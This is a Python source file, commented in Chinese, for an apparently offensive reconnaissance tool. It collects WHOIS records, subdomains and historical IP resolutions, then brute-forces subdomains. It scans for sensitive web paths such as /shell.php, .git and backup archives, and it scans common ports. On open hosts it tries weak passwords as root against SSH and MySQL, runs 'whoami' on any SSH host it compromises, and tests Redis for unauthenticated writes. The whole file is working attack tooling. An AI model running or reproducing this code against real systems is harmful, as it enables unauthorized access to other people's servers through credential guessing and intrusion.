#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#定义utf-8编码

#导入模块
import os
import sys
import time
import queue
import redis
import socket
import pymysql
import paramiko
import requests
import threading
from color import *
from MpFind import msg_input
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)   #禁用安全警告

###########定义变量###########

#收集列表
all_list = []

#请求头部
head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20200101 Firefox/100.0',
    'Connection': 'keep-alive'
        }

#当前解析ip列表
now_jiexi = []

#创建队列，不限制大小
q = queue.Queue()
q1 = queue.Queue()
q2 = queue.Queue()
Ssh = queue.Queue()
Mysql = queue.Queue()

#常见端口
ports = [21,  # ftp
         22,  # ssh
         23,  # telnet
         53,  # dns
         135,
         139,  # samba
         389,  # ldap
         445,  # smb
         512, 513, 514,  # 利用rlogin命令利用
         873,  # rsync
         1090, 1099,  # rmi
         1433,  # mssql
         1521,  # oracle
         2181,  # zookeeper未授权
         2375,  # docker未授权
         3306,  # mysql
         3389,  # rdp
         4444,
         5432,  # postgresql
         5900,  # vnc
         6379,  # redis
         7001,  # weblogic
         80, 443, 8080,  # web应用
         8000,  # jdwp
         8069,  # zabbix
         8161,  # activemq
         8080,  # jenkins,glassfish,jetty,resin,jboss,tomcat
         9090,  # websphere
         9200, 9300,  # elasticsearch-rce
         11211,  # memcache未授权
         27017,  # mongodb未授权
        ]


###########定义类###########

#whois信息查询 https://www.zzy.cn/
class cha_whois(object):
    def __init__(self,domain):
        self.domain = domain
        self.Cha_whois()

    def Cha_whois(self):
        #请求的post数据
        data = str(self.domain)
        #请求接口
        poc= 'https://www.zzy.cn/domain/whois_in.html?querydn='+data
        #使用自定义请求头，请求数据，禁用ssl验证，超时时间5秒
        try:
            req = requests.get(poc,headers=head,timeout=5,verify=False)
            #print(req.text)
            #编码方式utf-8
            req.encoding="utf-8"
            #格式化返回beautifulsoup对象
            soup=BeautifulSoup(req.text,'lxml')
            print("Whois信息:")
            whois = str(soup.pre.string)
            if whois == 'None':
                whois = soup.find_all(name='pre',style="white-space: pre-wrap;")
                print(whois)
            else:
                print(whois)
        except:
            try:
                req = requests.get(poc, headers=head, timeout=5, verify=False)
                text = req.text
                text = text.split('|')
                print(text[2]+'\n')
            except:
                print("未查询到注册信息，该域名可能尚未注册!\n")


#网络子域名收集 https://chaziyu.com/
class cha_zhiyu():
    #初始化
    def __init__(self,domain):
        self.domain = domain
        #调用Cha_zhiyu方法
        self.Cha_zhiyu(domain=self.domain)

    def Cha_zhiyu(self,domain):
        #查询的网站接口
        poc = 'https://chaziyu.com/' + domain + '/'
        #自定义请求头，超时时间5秒。禁用ssl认证
        try:
            # 用于去重
            domains = []
            req = requests.get(poc,headers=head,timeout=5,verify=False)
            req.encoding="utf-8"
            # 格式化返回beautifulsoup对象
            soup=BeautifulSoup(req.text,'lxml')
            try:
                # 筛选所有td标签并且有子标签a并且a标签属性有rel="nofollow"
                cha = soup.select('td > a[rel="nofollow"]')
                for i in cha:
                        if i.string not in domains:
                            domains.append(i.string)
            except:
                pass
            # 筛选所有tr标签并且class类等于J_link
            cha1 = soup.find_all(name='tr',class_="J_link")
            try:
                for i in cha1:
                    if i.a.string not in domains:
                        domains.append(i.a.string)
            except:
                pass
            if len(domains)==0:
                print("没有找到相关信息。")
            for i in domains:
                print(i)
                all_list.append(i)
            print('\n')
        except:
            print("没有找到相关信息。")


#ip历史解析记录 https://site.ip138.com/ https://ipchaxun.com/
#创建查询子域名ip函数
def cha_domain(domain):
    poc = 'https://site.ip138.com/'
    poc = poc + domain
    try:
        req = requests.get(poc,headers=head,timeout=5,verify=False)  #使用自定义请求头，不使用ssl验证
        req.encoding="utf-8"                    #编码方式改为utf-8解决中文乱码
        soup = BeautifulSoup(req.text,'lxml')   #字符串创建BeautifulSoup对象
        list = soup.find_all('div',id="J_ip_history")          #列出所有的a标签
        ip1 = []
        for i in list:
            ip = i.find_all('a')
            for j in ip:
                # print(j.string)
                ip1.append(j.string)
        return ip1
    except ValueError as e:
        print(e)
    except:
        pass

def cha_ip(domain):
    #数据接口
    poc = 'https://ipchaxun.com/' + domain + '/'
    #使用自定义请求头，禁用ssl验证
    try:
        req = requests.get(poc,timeout=5,verify=False,headers=head)
        soup = BeautifulSoup(req.text,'lxml')
        #筛选全部div并且id属性等于J_ip_history
        history_ip = soup.find_all('div',id="J_ip_history")
        ip2 = []
        for i in history_ip:
            ip = i.find_all('a')
            for j in ip:
                # print(j.string)
                ip2.append(j.string)
        return ip2
    except:
        pass

def Now_jiexi(domain):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) \Gecko/20200101 Firefox/100.0',
        'Connection': 'keep-alive'
    }
    poc = 'https://ping.pe/' + domain
    #print(poc)
    try:
        req = requests.get(poc,timeout=5,verify=False,headers=header)
        soup = BeautifulSoup(req.text,'lxml')
        # print(soup)
        cook = soup.find_all('script')
        #print(cook[1])
        cook = cook[1]
        cookie = str(cook).split('"')
        # print(cookie[1])
        header['cookie'] = cookie[1]
    except:
        pass
    #print(header)
    jiexi_ip = []
    for j in range(5):
        req = requests.get(poc,timeout=5,verify=False,headers=header)
        soup = BeautifulSoup(req.text,'lxml')
        #print(soup)
        ip = soup.find_all('div',id="page-div")
        # print(ip)
        for i in ip:
            ip = i.find_all('p')
            # print(ip[1])
            new = ip[1]
            new = str(new)
            jiexi = new.split()
            #print(jiexi[1])
            if jiexi[1] == []:
                break
            jiexi_ip.append(jiexi[1])
        time.sleep(2)
    #print(jiexi_ip)
    if jiexi_ip == []:
        pass
    elif jiexi_ip[0] == jiexi_ip[1] ==jiexi_ip[2] == jiexi_ip[3] == jiexi_ip[4]:
        print(domain+"当前ip解析："+jiexi_ip[3])
        msg_input(msg="\n"+domain+" 当前ip解析: "+jiexi_ip[3]+"\n******************************************\n")
    else:
        print(domain+"当前ip解析可能使用了CDN")


#http子域名爆破
#创建自定义线程类
class cha_brute(object):
    #初始化
    def __init__(self,domain):
        # 自定义线程必须在__init__方法的第一行添加 threading.Thread.__init__(self)
        threading.Thread.__init__(self)
        self.domain = domain
        #调用方法
        self.run()
    def run(self):
        brute_dict = ['a','b','c','www','d','zq','aq','blog','info','auto','gov','health','home','admin','house','img','jk','job','pub','map','xyz','site']
        for i in brute_dict:
            url = 'http://' + i + '.' + self.domain
            urls = 'https://' + i + '.' + self.domain
            q.put(url)
            q.put(urls)

def Brute():
    while not q.empty():
        url = q.get()
        try:
            # 请求时间3秒,不进行ssl验证
            req = requests.get(url, timeout=3,verify=False)
            if req.status_code < 205:   #请求状态码，通常为200
                print('[+]  '+url)
                all_list.append(url)
            elif code.status_code == 403:
                print('[+]  ' + url + "  403")
        except:
            pass


#web目录扫描
class crawl():
    #初始化
    def __init__(self,domain):
        self.domain = domain
        #调用Url方法
        self.Url()

    #创建方法
    def Url(self):
        dict = [':81',':88',':2181',':3128',':3306',':7001',':8000',':8080',':8081',':8088',':8888',':9090',':9300',':9999',':11211',':27017','/shell.php',
                '/phpinfo.php','/login','/admin','/admin.php','/install','/install.php','/index.php','/index.html','/phpMyAdmin','/robots.txt','/upload',
                '/wwwroot.tar','/wwwroot.zip','/backup/','/.git','/.snv','/setup/','/druid/','/?s=index','/api/','/WEB-INF/web.xml','/jmx-console/','/jbossws/',
                '/solr','/solr/admin','/servlet/~ic/bsh.servlet.BshServlet','/zabbix',':888/pma',':2375/version',':2375/images/json']
        #遍历文档内容
        for i in dict:
            #rstrip去掉尾随换行符
            if "http://" not in str(self.domain) and "https://" not in str(self.domain):
                url = "http://" + self.domain + i
                urls = "https://" + self.domain + i
                # 放入队列内容
                q1.put(url)
                q1.put(urls)
            else:
                url = self.domain + i.rstrip('\n')
                q1.put(url)
        # q.task_done()

#创建自定义线程类
class crawl_scan(threading.Thread):
    def __init__(self):
        #自定义线程类必须添加
        threading.Thread.__init__(self)
    #自运行方法
    def run(self):
        #如果队列不为空执行
        while not q1.empty():
            #从队列中取值
            url = q1.get()
            try:
                #超时时间3秒，使用自定义请求头，禁用ssl验证
                req = requests.get(url, timeout=3, verify=False, headers=head)
                if req.status_code < 205:
                    print("[+]  " + url)
                    if ":2375/images/json" in url:
                        print("\n[+] "+url+" 可能存在docker未授权...\n")
                        msg_input(msg="\n[+] "+url+" 可能存在docker未授权...\n")
                    msg_input(msg=url)
                elif req.status_code == 403:
                    print("[+]  " + url +"  403")
                    msg_input(msg=url+'  403')
            except:
                pass


#常见的端口扫描
#ssh弱口令
def SSH_brute(host):
    dict = ['root','toor','123456','admin','password','zxcvbnm','mysql']
    for i in dict:
        passwd = i
        #将字典密码放入队列
        Ssh.put(passwd)
    for j in range(10):
        t = threading.Thread(target=ssh, args=(host,))
        t.start()

#ssh连接
def ssh(host):
    #如果队列不为空
    while not Ssh.empty():
        passwd = Ssh.get()
        #创建一个ssh对象
        ssh = paramiko.SSHClient()
        #如果是一次连接会出现选择yes或者No，这里是自动选择yes
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        username = "root"
        port = 22
        try:
            #进行连接
            ssh.connect(host, port, username, passwd, timeout=4)
            print('\nssh[+] ' + host + '  username: ' + username + '  passwd: ' + passwd)
            #执行命令
            stdin, stdout, stderr = ssh.exec_command('whoami')
            #获取命令结果
            result = stdout.read().decode('utf-8')
            print("whoami:" + result)
            msg_input(msg='\nssh[+] ' + host + '  username:' + username + '  passwd:' + passwd + "\nwhoami:" + result)
        except paramiko.ssh_exception.SSHException as e:
            pass
        except paramiko.ssh_exception.SSHException as ess:
            pass
        except:
            pass

#mysql弱口令
def mysql_brute(host):
    dict = ['root','toor','123456','admin','password','zxcvbnm','mysql']
    for i in dict:
        passwd = i
        Mysql.put(passwd)
    for i in range(10):
        t = threading.Thread(target=mysql_connect, args=(host,))
        t.start()

#mysql连接
def mysql_connect(host):
    username = 'root'
    while not Mysql.empty():
        passwd = Mysql.get()
        try:
            mysql = pymysql.Connect(host=host,port=3306,user=username,passwd=passwd,charset='utf8')
            print("\nmysql[+] "+host+"  username:"+username+"  passwd:"+passwd+'\n')
            msg_input(msg="\nmysql[+] "+host+"  username:"+username+"  passwd:"+passwd+'\n')
            mysql.close()
        except pymysql.err.OperationalError as e:
            pass


#redis未授权
def Redis(host):
    try:
        r = redis.Redis(host=host, port=6379,decode_responses=True)
        r.set('username','ling')
        f = r.get('username')
        if "ling" in str(f):
            print("\n[+] "+host+" 可能存在redis未授权...\n")
            msg_input(msg='\n[+] '+host+' 可能存在redis未授权...\n')
    except redis.exceptions.ConnectionError as e:
        print(e)
    except:
        pass

def Port_Scan(host):
    while not q2.empty():
        # 从队列取值
        port = q2.get()
        # 创建客户端
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 设置当前socket连接超时时间秒
        client.settimeout(5)
        try:
            # 端口连接
            ling = client.connect_ex((host, port))
            if ling == 0:
                print("[+]open " + host + "  " + str(port))  # 打印开放的端口
                msg_input(msg=host+":"+str(port)+" open")
                if port == 22:
                    #调用ssh爆破
                    SSH_brute(host)
                if port == 3306:
                    mysql_brute(host)
                if port == 6379:
                    Redis(host)
            # 关闭客户端
            client.close()
        except:
            pass

#将端口放入队列
def port_get():
    for i in ports:
        q2.put(i)

def add_all_list(url):
    all_list.append(url)

def print_all_list():
    return all_list

def remove_all_list():
    all_list.clear()


###########调用###########

#查询whois信息
class cha_Whois():
    def __init__(self,domain):
        self.domain = domain
        self.run()
    def run(self):
        color_print(color='purple',msg="正在查询 "+self.domain)
        cha_whois(self.domain)


#网络子域名收集
class search_domain():
    def __init__(self,domain):
        self.domain = domain
        self.run()
    def run(self):
        color_print(color='purple', msg="正在收集 "+self.domain)
        cha_zhiyu(self.domain)


# ip历史解析记录
class history_ip():
    def __init__(self,domain):
        self.domain = domain
        self.run()
    def run(self):
        color_print(color='purple', msg="正在收集 "+self.domain)
        Now_jiexi(self.domain)
        a = cha_domain(self.domain)
        b = cha_ip(self.domain)
        try:
            c = list(a) + list(b)
            q_ip = []
            for i in c:
                if i not in q_ip:
                    q_ip.append(i)
            if len(q_ip)==0:
                print("没有找到相关历史ip解析信息。")
            else:
                print('\n'+self.domain + "历史ip解析：")
            for j in q_ip:
                print(j)
                all_list.append(j)
            print('\n')
        except TypeError as e:
            pass


# 子域名爆破
class brute(threading.Thread):
    def __init__(self,domain, thread=20):
        threading.Thread.__init__(self)
        self.domain = domain
        self.thread = thread
    def run(self):
        print('{:-^50}'.format(''))
        color_print(color='yellow', msg="开始进行子域名爆破......\n")
        color_print(color='purple',msg="正在爆破 "+self.domain)
        cha_brute(self.domain)
        threads = []
        for i in range(self.thread):
            t = threading.Thread(target=Brute)
            t.start()
            threads.append(t)
        for j in threads:
            j.join()


#web扫描
class Crawl(threading.Thread):
    def __init__(self, thread=20):
        threading.Thread.__init__(self)
        self.thread = thread

    def run(self):
        msg_input(msg="\n------------------------------------------\n\n扫描结果\n------------------------------------------")
        print('{:-^50}'.format(''))
        color_print(color='yellow',msg="开始进行常见web目录扫描......\n")
        status = []
        dic = [':80', ':443', ':7001', ':8080']
        ddics = []
        for a in all_list:
                try:
                    b = a.split('/')
                    c = b[2]
                    ddics.append(c)
                except:
                    ddics.append(a)
        try:
            all_list.clear()
            for d in ddics:
                if d not in all_list:
                    all_list.append(d)
        except:
            pass
        for i in all_list:
            j = "http://" + i
            for a in dic:
                url = j+a
                try:
                    req = requests.get(url, timeout=2, verify=False)
                    code = int(req.status_code)
                    status.append(code)
                except:
                    pass
            if len(status) == 0:
                print(str(i) + " url访问失败，取消目录扫描")
                all_list.remove(i)
            else:
                domain = i
                color_print(color='purple', msg="正在扫描 " + domain)
                crawl(domain)
                threads = []
                for c in range(self.thread):
                    t = crawl_scan()
                    t.start()
                    threads.append(t)
                for d in threads:
                    d.join()


#端口扫描
class port_scan(threading.Thread):
    def __init__(self, thread=20):
        threading.Thread.__init__(self)
        self.thread = thread

    def run(self):
        print('{:-^50}'.format(''))
        color_print(color='yellow',msg="开始进行常用的端口扫描......\n")
        for i in all_list:
            if "http" in i:
                j = i.split("/")
                i = j[2]
                s = os.popen('ping -n 2 -w 200 ' + i).read()
            else:
                s = os.popen('ping -n 2 -w 200 '+i).read()
            if "TTL=" in str(s):
                domain = i
                color_print(color='purple',msg="正在扫描 "+domain)
                threads = []
                port_get()
                for a in range(self.thread):
                    t = threading.Thread(target=Port_Scan, args=(domain,))
                    t.start()
                    threads.append(t)
                for d in threads:
                    d.join()
            else:
                print(str(i) + " 主机访问失败，取消端口扫描")

#结束
def end():
    message = """\n-------------------- 扫描完成 --------------------
相关的ip子域信息保存在当前目录下的'output.txt'文件中...
              """
    color_print(color='green',msg=message)